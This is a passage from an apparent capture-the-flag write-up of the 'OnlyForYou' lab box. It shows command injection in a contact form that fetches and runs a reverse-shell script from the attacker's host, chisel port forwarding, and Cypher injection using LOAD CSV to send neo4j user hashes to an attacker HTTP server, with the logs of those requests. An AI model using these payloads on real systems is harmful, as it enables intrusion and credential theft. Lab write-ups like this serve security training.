+</span></span></code></pre></div><p>Now, we just download the <code>[shel.sh](http://shel.sh)</code> file containing the reverse shell payload and then executing it with the next request with <code>bash /tmp/shell.sh</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">name</span><span class="o">=</span><span class="n">robin</span><span class="o">&amp;</span><span class="n">email</span><span class="o">=</span><span class="n">robin</span><span class="o">%</span><span class="mi">40</span><span class="n">only4you</span><span class="o">%</span><span class="mi">2</span><span class="n">Ehtb</span><span class="o">%</span><span class="mi">3</span><span class="n">Bwget</span><span class="o">%</span><span class="mi">20</span><span class="n">http</span><span class="o">%</span><span class="mi">3</span><span class="n">A</span><span class="o">%</span><span class="mi">2</span><span class="n">F</span><span class="o">%</span><span class="mi">2</span><span class="n">F10</span><span class="o">%</span><span class="mf">2E10</span><span class="o">%</span><span class="mf">2E14</span><span class="o">%</span><span class="mf">2E22</span><span class="o">%</span><span class="mi">2</span><span class="n">Fshell</span><span class="o">%</span><span class="mi">2</span><span class="n">Esh</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">2</span><span class="n">DO</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">2</span><span class="n">Ftmp</span><span class="o">%</span><span class="mi">2</span><span class="n">Fshell</span><span class="o">%</span><span class="mi">2</span><span class="n">Esh</span><span class="o">&amp;</span><span class="n">subject</span><span class="o">=</span><span class="n">nothing</span><span class="o">&amp;</span><span class="n">message</span><span class="o">=</span><span class="n">al</span>
+</span></span><span class="line"><span class="cl"><span class="n">name</span><span class="o">=</span><span class="n">robin</span><span class="o">&amp;</span><span class="n">email</span><span class="o">=</span><span class="n">robin</span><span class="o">%</span><span class="mi">40</span><span class="n">only4you</span><span class="o">%</span><span class="mi">2</span><span class="n">Ehtb</span><span class="o">%</span><span class="mi">3</span><span class="n">Bbash</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">2</span><span class="n">Ftmp</span><span class="o">%</span><span class="mi">2</span><span class="n">Fshell</span><span class="o">%</span><span class="mi">2</span><span class="n">Esh</span><span class="o">&amp;</span><span class="n">subject</span><span class="o">=</span><span class="n">nothing</span><span class="o">&amp;</span><span class="n">message</span><span class="o">=</span><span class="n">al</span>
+</span></span></code></pre></div><p>Doing so, we got the connection on the listener:</p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="/img/OnlyForYou_6cf32928838a4b23bc4a47a1102c4daf/Untitled_6.png" alt="" class="mx-auto my-0 rounded-md" />
+</figure>
+</p>
+<p>After doing initial enumeration, I noticed there were two users named <code>john</code> and <code>dev</code> and in the <code>/opt</code> folder, we see that there were two folders <code>gogs</code> and <code>internal_app</code> but we did not have permissions to check the folder, moving on, I saw that there were two ports in use <code>3000</code> and <code>8001</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">bash</span><span class="o">-</span><span class="mf">5.0</span><span class="err">$</span> <span class="n">netstat</span> <span class="o">-</span><span class="n">ntpl</span>
+</span></span><span class="line"><span class="cl"><span class="n">netstat</span> <span class="o">-</span><span class="n">ntpl</span>
+</span></span><span class="line"><span class="cl"><span class="n">Active</span> <span class="n">Internet</span> <span class="n">connections</span> <span class="p">(</span><span class="n">only</span> <span class="n">servers</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">Proto</span> <span class="n">Recv</span><span class="o">-</span><span class="n">Q</span> <span class="n">Send</span><span class="o">-</span><span class="n">Q</span> <span class="n">Local</span> <span class="n">Address</span>           <span class="n">Foreign</span> <span class="n">Address</span>         <span class="n">State</span>       <span class="n">PID</span><span class="o">/</span><span class="n">Program</span> <span class="n">name</span>    
+</span></span><span class="line"><span class="cl"><span class="n">tcp</span>        <span class="mi">0</span>      <span class="mi">0</span> <span class="mf">127.0.0.1</span><span class="p">:</span><span class="mi">3000</span>          <span class="mf">0.0.0.0</span><span class="p">:</span><span class="o">*</span>               <span class="n">LISTEN</span>      <span class="o">-</span>                   
+</span></span><span class="line"><span class="cl"><span class="n">tcp</span>        <span class="mi">0</span>      <span class="mi">0</span> <span class="mf">127.0.0.1</span><span class="p">:</span><span class="mi">8001</span>          <span class="mf">0.0.0.0</span><span class="p">:</span><span class="o">*</span>               <span class="n">LISTEN</span>      <span class="o">-</span>                   
+</span></span><span class="line"><span class="cl"><span class="n">tcp</span>        <span class="mi">0</span>      <span class="mi">0</span> <span class="mf">127.0.0.1</span><span class="p">:</span><span class="mi">33060</span>         <span class="mf">0.0.0.0</span><span class="p">:</span><span class="o">*</span>               <span class="n">LISTEN</span>      <span class="o">-</span>                   
+</span></span><span class="line"><span class="cl"><span class="n">tcp</span>        <span class="mi">0</span>      <span class="mi">0</span> <span class="mf">127.0.0.1</span><span class="p">:</span><span class="mi">3306</span>          <span class="mf">0.0.0.0</span><span class="p">:</span><span class="o">*</span>               <span class="n">LISTEN</span>      <span class="o">-</span>                   
+</span></span><span class="line"><span class="cl"><span class="n">tcp</span>        <span class="mi">0</span>      <span class="mi">0</span> <span class="mf">0.0.0.0</span><span class="p">:</span><span class="mi">80</span>              <span class="mf">0.0.0.0</span><span class="p">:</span><span class="o">*</span>               <span class="n">LISTEN</span>      <span class="mi">1034</span><span class="o">/</span><span class="n">nginx</span><span class="p">:</span> <span class="n">worker</span>  
+</span></span><span class="line"><span class="cl"><span class="n">tcp</span>        <span class="mi">0</span>      <span class="mi">0</span> <span class="mf">127.0.0.53</span><span class="p">:</span><span class="mi">53</span>           <span class="mf">0.0.0.0</span><span class="p">:</span><span class="o">*</span>               <span class="n">LISTEN</span>      <span class="o">-</span>                   
+</span></span><span class="line"><span class="cl"><span class="n">tcp</span>        <span class="mi">0</span>      <span class="mi">0</span> <span class="mf">0.0.0.0</span><span class="p">:</span><span class="mi">22</span>              <span class="mf">0.0.0.0</span><span class="p">:</span><span class="o">*</span>               <span class="n">LISTEN</span>      <span class="o">-</span>                   
+</span></span><span class="line"><span class="cl"><span class="n">tcp6</span>       <span class="mi">0</span>      <span class="mi">0</span> <span class="mf">127.0.0.1</span><span class="p">:</span><span class="mi">7687</span>          <span class="p">:::</span><span class="o">*</span>                    <span class="n">LISTEN</span>      <span class="o">-</span>                   
+</span></span><span class="line"><span class="cl"><span class="n">tcp6</span>       <span class="mi">0</span>      <span class="mi">0</span> <span class="mf">127.0.0.1</span><span class="p">:</span><span class="mi">7474</span>          <span class="p">:::</span><span class="o">*</span>                    <span class="n">LISTEN</span>      <span class="o">-</span>                   
+</span></span><span class="line"><span class="cl"><span class="n">tcp6</span>       <span class="mi">0</span>      <span class="mi">0</span> <span class="p">:::</span><span class="mi">22</span>                   <span class="p">:::</span><span class="o">*</span>                    <span class="n">LISTEN</span>      <span class="o">-</span>                   
+</span></span><span class="line"><span class="cl"><span class="n">bash</span><span class="o">-</span><span class="mf">5.0</span><span class="err">$</span> <span class="n">cd</span> <span class="o">/</span><span class="n">tmp</span>
+</span></span></code></pre></div><p>Since we do not have the SSH connection, I used the <code>chisel</code> to perform port forwarding:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">bash</span><span class="o">-</span><span class="mf">5.0</span><span class="err">$</span> <span class="o">./</span><span class="n">chisel</span> <span class="n">client</span> <span class="mf">10.10.14.22</span><span class="p">:</span><span class="mi">9999</span> <span class="n">R</span><span class="p">:</span><span class="mi">8001</span><span class="p">:</span><span class="mf">127.0.0.1</span><span class="p">:</span><span class="mi">8001</span> <span class="n">R</span><span class="p">:</span><span class="mi">3000</span><span class="p">:</span><span class="mf">127.0.0.1</span><span class="p">:</span><span class="mi">3000</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="mi">22</span><span class="p">:</span><span class="mi">9999</span> <span class="n">R</span><span class="p">:</span><span class="mi">8001</span><span class="p">:</span><span class="mf">127.0.0.1</span><span class="p">:</span><span class="mi">8001</span> <span class="n">R</span><span class="p">:</span><span class="mi">3000</span><span class="p">:</span><span class="mf">127.0.0.1</span><span class="p">:</span><span class="mi">3000</span>
+</span></span><span class="line"><span class="cl"><span class="mi">2023</span><span class="o">/</span><span class="mi">04</span><span class="o">/</span><span class="mi">23</span> <span class="mi">07</span><span class="p">:</span><span class="mi">40</span><span class="p">:</span><span class="mi">38</span> <span class="n">client</span><span class="p">:</span> <span class="n">Connecting</span> <span class="n">to</span> <span class="n">ws</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.14.22</span><span class="p">:</span><span class="mi">9999</span>
+</span></span><span class="line"><span class="cl"><span class="mi">2023</span><span class="o">/</span><span class="mi">04</span><span class="o">/</span><span class="mi">23</span> <span class="mi">07</span><span class="p">:</span><span class="mi">40</span><span class="p">:</span><span class="mi">39</span> <span class="n">client</span><span class="p">:</span> <span class="n">Connected</span> <span class="p">(</span><span class="n">Latency</span> <span class="mf">112.100734</span><span class="n">ms</span><span class="p">)</span>
+</span></span></code></pre></div><p>Checking the port <code>3000</code> , it was running <code>gogs</code> and we did not have any credentials to check here:</p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="/img/OnlyForYou_6cf32928838a4b23bc4a47a1102c4daf/Untitled_7.png" alt="" class="mx-auto my-0 rounded-md" />
+</figure>
+</p>
+<p>Moving on to the port <code>8001</code> , it also had a login page:</p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="/img/OnlyForYou_6cf32928838a4b23bc4a47a1102c4daf/Untitled_8.png" alt="" class="mx-auto my-0 rounded-md" />
+</figure>
+</p>
+<p>Trying with the following credentials resulted in the application access:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">admin</span><span class="p">:</span><span class="n">admin</span>
+</span></span></code></pre></div><p>
+
+
+
+
+
+
+  
+  
+<figure><img src="/img/OnlyForYou_6cf32928838a4b23bc4a47a1102c4daf/Untitled_9.png" alt="" class="mx-auto my-0 rounded-md" />
+</figure>
+</p>
+<p>The application had a task marked as completed that the transfer to <code>neo4j</code> database has been completed:</p>
+<p>We also had a “Employee” page which allowed us to search for employees:</p>
+<p>Giving a single quote in the search box resulted in <code>500</code> error:</p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="/img/OnlyForYou_6cf32928838a4b23bc4a47a1102c4daf/Untitled_10.png" alt="" class="mx-auto my-0 rounded-md" />
+</figure>
+</p>
+<p>Given, we already know that the backend database is <code>neo4j</code> , just a note that it differs from the SQL queries, <code>neo4j</code> uses Cypher Queries and for the Cypher queries one thing to note down is that every query must return some sort of the value. To check and confirm the hypothesis of the injection, there is a procedure named as <code>LOAD CSV FROM</code> which can be used to load arbitrary values from a remote server over HTTP connection. Here, we just tried to check if it makes the connection to our remote HTTP server:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="s1">&#39; OR 1=1 LOAD CSV FROM &#39;</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.14.22</span><span class="s1">&#39; AS y RETURN &#39;&#39;//</span>
+</span></span></code></pre></div><p>Injecting the above query and checking the HTTP Server, we see that there were some requests made to it from <code>10.10.11.210</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="err">❯</span> <span class="n">sudo</span> <span class="n">python3</span> <span class="o">-</span><span class="n">m</span> <span class="n">http</span><span class="o">.</span><span class="n">server</span> <span class="mi">80</span> <span class="o">--</span><span class="n">bind</span> <span class="mf">10.10.14.22</span>
+</span></span><span class="line"><span class="cl"><span class="n">Serving</span> <span class="n">HTTP</span> <span class="n">on</span> <span class="mf">10.10.14.22</span> <span class="n">port</span> <span class="mi">80</span> <span class="p">(</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.14.22</span><span class="p">:</span><span class="mi">80</span><span class="o">/</span><span class="p">)</span> <span class="o">...</span>
+</span></span><span class="line"><span class="cl"><span class="mf">10.10.11.210</span> <span class="o">-</span> <span class="o">-</span> <span class="p">[</span><span class="mi">23</span><span class="o">/</span><span class="n">Apr</span><span class="o">/</span><span class="mi">2023</span> <span class="mi">11</span><span class="p">:</span><span class="mi">10</span><span class="p">:</span><span class="mi">29</span><span class="p">]</span> <span class="s2">&#34;GET / HTTP/1.1&#34;</span> <span class="mi">200</span> <span class="o">-</span>
+</span></span><span class="line"><span class="cl"><span class="mf">10.10.11.210</span> <span class="o">-</span> <span class="o">-</span> <span class="p">[</span><span class="mi">23</span><span class="o">/</span><span class="n">Apr</span><span class="o">/</span><span class="mi">2023</span> <span class="mi">11</span><span class="p">:</span><span class="mi">10</span><span class="p">:</span><span class="mi">29</span><span class="p">]</span> <span class="s2">&#34;GET / HTTP/1.1&#34;</span> <span class="mi">200</span> <span class="o">-</span>
+</span></span><span class="line"><span class="cl"><span class="mf">10.10.11.210</span> <span class="o">-</span> <span class="o">-</span> <span class="p">[</span><span class="mi">23</span><span class="o">/</span><span class="n">Apr</span><span class="o">/</span><span class="mi">2023</span> <span class="mi">11</span><span class="p">:</span><span class="mi">10</span><span class="p">:</span><span class="mi">30</span><span class="p">]</span> <span class="s2">&#34;GET / HTTP/1.1&#34;</span> <span class="mi">200</span> <span class="o">-</span>
+</span></span><span class="line"><span class="cl"><span class="mf">10.10.11.210</span> <span class="o">-</span> <span class="o">-</span> <span class="p">[</span><span class="mi">23</span><span class="o">/</span><span class="n">Apr</span><span class="o">/</span><span class="mi">2023</span> <span class="mi">11</span><span class="p">:</span><span class="mi">10</span><span class="p">:</span><span class="mi">30</span><span class="p">]</span> <span class="s2">&#34;GET / HTTP/1.1&#34;</span> <span class="mi">200</span> <span class="o">-</span>
+</span></span></code></pre></div><p>Next thing to try here is to extract <code>labels</code>  which is equivalent for SQL’s tables:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="s1">&#39; MATCH (n) WITH 1337 AS x CALL db.labels() YIELD label AS d LOAD CSV FROM &#39;</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.14.22</span><span class="o">/</span><span class="s1">&#39;+d AS y RETURN y //</span>
+</span></span></code></pre></div><p>And on our HTTP server, we see that a request to <code>user</code> endpoint was made which means there is a label called <code>user</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="mf">10.10.11.210</span> <span class="o">-</span> <span class="o">-</span> <span class="p">[</span><span class="mi">23</span><span class="o">/</span><span class="n">Apr</span><span class="o">/</span><span class="mi">2023</span> <span class="mi">11</span><span class="p">:</span><span class="mi">22</span><span class="p">:</span><span class="mi">03</span><span class="p">]</span> <span class="s2">&#34;GET /user HTTP/1.1&#34;</span> <span class="mi">404</span>
+</span></span></code></pre></div><p>Now that we know the <code>label</code> , we can get the data from the <code>label</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="s1">&#39; OR 1=1 WITH 1 as a MATCH (f:User) UNWIND keys(f) as p LOAD CSV FROM &#39;</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.14.22</span><span class="o">/</span><span class="err">?</span><span class="s1">&#39; + p +&#39;</span><span class="o">=</span><span class="s1">&#39;+toString(f[p]) as l RETURN 0 as _0 //</span>
+</span></span></code></pre></div><p>Injecting the payload resulted in several connections to our HTTP server revealing the hashes and usernames:</p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="/img/OnlyForYou_6cf32928838a4b23bc4a47a1102c4daf/Untitled_11.png" alt="" class="mx-auto my-0 rounded-md" />
+</figure>
+</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="err">❯</span> <span class="n">sudo</span> <span class="n">python3</span> <span class="o">-</span><span class="n">m</span> <span class="n">http</span><span class="o">.</span><span class="n">server</span> <span class="mi">80</span> <span class="o">--</span><span class="n">bind</span> <span class="mf">10.10.14.22</span>
+</span></span><span class="line"><span class="cl"><span class="n">Serving</span> <span class="n">HTTP</span> <span class="n">on</span> <span class="mf">10.10.14.22</span> <span class="n">port</span> <span class="mi">80</span> <span class="p">(</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.14.22</span><span class="p">:</span><span class="mi">80</span><span class="o">/</span><span class="p">)</span> <span class="o">...</span>
+</span></span><span class="line"><span class="cl"><span class="mf">10.10.11.210</span> <span class="o">-</span> <span class="o">-</span> <span class="p">[</span><span class="mi">23</span><span class="o">/</span><span class="n">Apr</span><span class="o">/</span><span class="mi">2023</span> <span class="mi">16</span><span class="p">:</span><span class="mi">28</span><span class="p">:</span><span class="mi">44</span><span class="p">]</span> <span class="s2">&#34;GET /shell.sh HTTP/1.1&#34;</span> <span class="mi">200</span> <span class="o">-</span>
+</span></span><span class="line"><span class="cl"><span class="mf">10.10.11.210</span> <span class="o">-</span> <span class="o">-</span> <span class="p">[</span><span class="mi">23</span><span class="o">/</span><span class="n">Apr</span><span class="o">/</span><span class="mi">2023</span> <span class="mi">16</span><span class="p">:</span><span class="mi">33</span><span class="p">:</span><span class="mi">04</span><span class="p">]</span> <span class="n">code</span> <span class="mi">404</span><span class="p">,</span> <span class="n">message</span> <span class="n">File</span> <span class="ow">not</span> <span class="n">found</span>
+</span></span><span class="line"><span class="cl"><span class="mf">10.10.11.210</span> <span class="o">-</span> <span class="o">-</span> <span class="p">[</span><span class="mi">23</span><span class="o">/</span><span class="n">Apr</span><span class="o">/</span><span class="mi">2023</span> <span class="mi">16</span><span class="p">:</span><span class="mi">33</span><span class="p">:</span><span class="mi">04</span><span class="p">]</span> <span class="s2">&#34;GET /user HTTP/1.1&#34;</span> <span class="mi">404</span> <span class="o">-</span>
+</span></span><span class="line"><span class="cl"><span class="mf">10.10.11.210</span> <span class="o">-</span> <span class="o">-</span> <span class="p">[</span><span class="mi">23</span><span class="o">/</span><span class="n">Apr</span><span class="o">/</span><span class="mi">2023</span> <span class="mi">16</span><span class="p">:</span><span class="mi">54</span><span class="p">:</span><span class="mi">50</span><span class="p">]</span> <span class="n">code</span> <span class="mi">404</span><span class="p">,</span> <span class="n">message</span> <span class="n">File</span> <span class="ow">not</span> <span class="n">found</span>
+</span></span><span class="line"><span class="cl"><span class="mf">10.10.11.210</span> <span class="o">-</span> <span class="o">-</span> <span class="p">[</span><span class="mi">23</span><span class="o">/</span><span class="n">Apr</span><span class="o">/</span><span class="mi">2023</span> <span class="mi">16</span><span class="p">:</span><span class="mi">54</span><span class="p">:</span><span class="mi">50</span><span class="p">]</span> <span class="s2">&#34;GET /neo4j HTTP/1.1&#34;</span> <span class="mi">404</span> <span class="o">-</span>
+</span></span><span class="line"><span class="cl"><span class="mf">10.10.11.210</span> <span class="o">-</span> <span class="o">-</span> <span class="p">[</span><span class="mi">23</span><span class="o">/</span><span class="n">Apr</span><span class="o">/</span><span class="mi">2023</span> <span class="mi">16</span><span class="p">:</span><span class="mi">56</span><span class="p">:</span><span class="mi">57</span><span class="p">]</span> <span class="n">code</span> <span class="mi">400</span><span class="p">,</span> <span class="n">message</span> <span class="n">Bad</span> <span class="n">request</span> <span class="n">syntax</span> <span class="p">(</span><span class="s1">&#39;GET /Neo4j Kernel HTTP/1.1&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="mf">10.10.11.210</span> <span class="o">-</span> <span class="o">-</span> <span class="p">[</span><span class="mi">23</span><span class="o">/</span><span class="n">Apr</span><span class="o">/</span><span class="mi">2023</span> <span class="mi">16</span><span class="p">:</span><span class="mi">56</span><span class="p">:</span><span class="mi">57</span><span class="p">]</span> <span class="s2">&#34;GET /Neo4j Kernel HTTP/1.1&#34;</span> <span class="mi">400</span> <span class="o">-</span>
+</span></span><span class="line"><span class="cl"><span class="mf">10.10.11.210</span> <span class="o">-</span> <span class="o">-</span> <span class="p">[</span><span class="mi">23</span><span class="o">/</span><span class="n">Apr</span><span class="o">/</span><span class="mi">2023</span> <span class="mi">17</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mi">45</span><span class="p">]</span> <span class="s2">&#34;GET /?password=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 HTTP/1.1&#34;</span> <span class="mi">200</span> <span class="o">-</span>
+</span></span><span class="line"><span class="cl"><span class="mf">10.10.11.210</span> <span class="o">-</span> <span class="o">-</span> <span class="p">[</span><span class="mi">23</span><span class="o">/</span><span class="n">Apr</span><span class="o">/</span><span class="mi">2023</span> <span class="mi">17</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mi">45</span><span class="p">]</span> <span class="s2">&#34;GET /?username=admin HTTP/1.1&#34;</span> <span class="mi">200</span> <span class="o">-</span>
+</span></span><span class="line"><span class="cl"><span class="mf">10.10.11.210</span> <span class="o">-</span> <span class="o">-</span> <span class="p">[</span><span class="mi">23</span><span class="o">/</span><span class="n">Apr</span><span class="o">/</span><span class="mi">2023</span> <span class="mi">17</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mi">45</span><span class="p">]</span> <span class="s2">&#34;GET /?password=a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6 HTTP/1.1&#34;</span> <span class="mi">200</span> <span class="o">-</span>
+</span></span><span class="line"><span class="cl"><span class="mf">10.10.11.210</span> <span class="o">-</span> <span class="o">-</span> <span class="p">[</span><span class="mi">23</span><span class="o">/</span><span class="n">Apr</span><span class="o">/</span><span class="mi">2023</span> <span class="mi">17</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mi">45</span><span class="p">]</span> <span class="s2">&#34;GET /?username=john HTTP/1.1&#34;</span> <span class="mi">200</span> <span class="o">-</span>
+</span></span><span class="line"><span class="cl"><span class="mf">10.10.11.210</span> <span class="o">-</span> <span class="o">-</span> <span class="p">[</span><span class="mi">23</span><span class="o">/</span><span class="n">Apr</span><span class="o">/</span><span class="mi">2023</span> <span class="mi">17</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mi">46</span><span class="p">]</span> <span class="s2">&#34;GET /?password=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 HTTP/1.1&#34;</span> <span class="mi">200</span> <span class="o">-</span>
+</span></span><span class="line"><span class="cl"><span class="mf">10.10.11.210</span> <span class="o">-</span> <span class="o">-</span> <span class="p">[</span><span class="mi">23</span><span class="o">/</span><span class="n">Apr</span><span class="o">/</span><span class="mi">2023</span> <span class="mi">17</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mi">46</span><span class="p">]</span> <span class="s2">&#34;GET /?username=admin HTTP/1.1&#34;</span> <span class="mi">200</span> <span class="o">-</span>
+</span></span><span class="line"><span class="cl"><span class="mf">10.10.11.210</span> <span class="o">-</span> <span class="o">-</span> <span class="p">[</span><span class="mi">23</span><span class="o">/</span><span class="n">Apr</span><span class="o">/</span><span class="mi">2023</span> <span class="mi">17</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mi">46</span><span class="p">]</span> <span class="s2">&#34;GET /?password=a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6 HTTP/1.1&#34;</span> <span class="mi">200</span> <span class="o">-</span>
+</span></span><span class="line"><span class="cl"><span class="mf">10.10.11.210</span> <span class="o">-</span> <span class="o">-</span> <span class="p">[</span><span class="mi">23</span><span class="o">/</span><span class="n">Apr</span><span class="o">/</span><span class="mi">2023</span> <span class="mi">17</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mi">46</span><span class="p">]</span> <span class="s2">&#34;GET /?username=john HTTP/1.1&#34;</span> <span class="mi">200</span> <span class="o">-</span>
+</span></span><span class="line"><span class="cl"><span class="mf">10.10.11.210</span> <span class="o">-</span> <span class="o">-</span> <span class="p">[</span><span class="mi">23</span><span class="o">/</span><span class="n">Apr</span><span class="o">/</span><span class="mi">2023</span> <span class="mi">17</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mi">46</span><span class="p">]</span> <span class="s2">&#34;GET /?password=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 HTTP/1.1&#34;</span> <span class="mi">200</span> <span class="o">-</span>
+</span></span><span class="line"><span class="cl"><span class="mf">10.10.11.210</span> <span class="o">-</span> <span class="o">-</span> <span class="p">[</span><span class="mi">23</span><span class="o">/</span><span class="n">Apr</span><span class="o">/</span><span class="mi">2023</span> <span class="mi">17</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mi">46</span><span class="p">]</span> <span class="s2">&#34;GET /?username=admin HTTP/1.1&#34;</span> <span class="mi">200</span> <span class="o">-</span>
+</span></span><span class="line"><span class="cl"><span class="mf">10.10.11.210</span> <span class="o">-</span> <span class="o">-</span> <span class="p">[</span><span class="mi">23</span><span class="o">/</span><span class="n">Apr</span><span class="o">/</span><span class="mi">2023</span> <span class="mi">17</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mi">47</span><span class="p">]</span> <span class="s2">&#34;GET /?password=a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6 HTTP/1.1&#34;</span> <span class="mi">200</span> <span class="o">-</span>
+</span></span><span class="line"><span class="cl"><span class="mf">10.10.11.210</span> <span class="o">-</span> <span class="o">-</span> <span class="p">[</span><span class="mi">23</span><span class="o">/</span><span class="n">Apr</span><span class="o">/</span><span class="mi">2023</span> <span class="mi">17</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mi">47</span><span class="p">]</span> <span class="s2">&#34;GET /?username=john HTTP/1.1&#34;</span> <span class="mi">200</span> <span class="o">-</span>
+</span></span><span class="line"><span class="cl"><span class="mf">10.10.11.210</span> <span class="o">-</span> <span class="o">-</span> <span class="p">[</span><span class="mi">23</span><span class="o">/</span><span class="n">Apr</span><span class="o">/</span><span class="mi">2023</span> <span class="mi">17</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mi">47</span><span class="p">]</span> <span class="s2">&#34;GET /?password=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 HTTP/1.1&#34;</span> <span class="mi">200</span> <span class="o">-</span>
+</span></span><span class="line"><span class="cl"><span class="mf">10.10.11.210</span> <span class="o">-</span> <span class="o">-</span> <span class="p">[</span><span class="mi">23</span><span class="o">/</span><span class="n">Apr</span><span class="o">/</span><span class="mi">2023</span> <span class="mi">17</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mi">47</span><span class="p">]</span> <span class="s2">&#34;GET /?username=admin HTTP/1.1&#34;</span> <span class="mi">200</span> <span class="o">-</span>
+</span></span><span class="line"><span class="cl"><span class="mf">10.10.11.210</span> <span class="o">-</span> <span class="o">-</span> <span class="p">[</span><span class="mi">23</span><span class="o">/</span><span class="n">Apr</span><span class="o">/</span><span class="mi">2023</span> <span class="mi">17</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mi">47</span><span class="p">]</span> <span class="s2">&#34;GET /?password=a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6 HTTP/1.1&#34;</span> <span class="mi">200</span> <span class="o">-</span>
+</span></span><span class="line"><span class="cl"><span class="mf">10.10.11.210</span> <span class="o">-</span> <span class="o">-</span> <span class="p">[</span><span class="mi">23</span><span class="o">/</span><span class="n">Apr</span><span class="o">/</span><span class="mi">2023</span> <span class="mi">17</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mi">47</span><span class="p">]</span> <span class="s2">&#34;GET /?username=john HTTP/1.1&#34;</span> <span class="mi">200</span> <span class="o">-</span>
+</span></span><span class="line"><span class="cl"><span class="mf">10.10.11.210</span> <span class="o">-</span> <span class="o">-</span> <span class="p">[</span><span class="mi">23</span><span class="o">/</span><span class="n">Apr</span><span class="o">/</span><span class="mi">2023</span> <span class="mi">17</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="s2">&#34;GET /?password=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 HTTP/1.1&#34;</span> <span class="mi">200</span> <span class="o">-</span>
+</span></span><span class="line"><span class="cl"><span class="mf">10.10.11.210</span> <span class="o">-</span> <span class="o">-</span> <span class="p">[</span><span class="mi">23</span><span class="o">/</span><span class="n">Apr</span><span class="o">/</span><span class="mi">2023</span> <span class="mi">17</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="s2">&#34;GET /?username=admin HTTP/1.1&#34;</span> <span class="mi">200</span> <span class="o">-</span>
+</span></span><span class="line"><span class="cl"><span class="mf">10.10.11.210</span> <span class="o">-</span> <span class="o">-</span> <span class="p">[</span><span class="mi">23</span><span class="o">/</span><span class="n">Apr</span><span class="o">/</span><span class="mi">2023</span> <span class="mi">17</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="s2">&#34;GET /?password=a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6 HTTP/1.1&#34;</span> <span class="mi">200</span> <span class="o">-</span>
